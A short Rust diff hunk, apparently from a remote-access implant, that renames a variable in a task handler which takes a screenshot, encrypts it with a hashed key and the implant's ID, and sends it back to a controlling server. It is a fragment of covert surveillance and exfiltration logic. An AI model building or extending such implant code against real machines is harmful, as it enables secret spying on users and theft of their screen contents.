@@ -137,12 +137,12 @@ pub fn handle_available_tasks(
                 }
             }
             task::Tasks::TakeScreenshot => {
-                let image_bytes = images::take_screenshot()?;
+                let screenshot_response = images::take_screenshot()?;
 
                 // Encrypt and send system_info
                 let task_id = task.task_id.to_string();
                 let encrypted_response =
-                    build_encrypted_response(&blake3_hashed_key, image_bytes, implant_id);
+                    build_encrypted_response(&blake3_hashed_key, screenshot_response, implant_id);
 
                 result::send_task(&task_id, encrypted_response)?;
             }
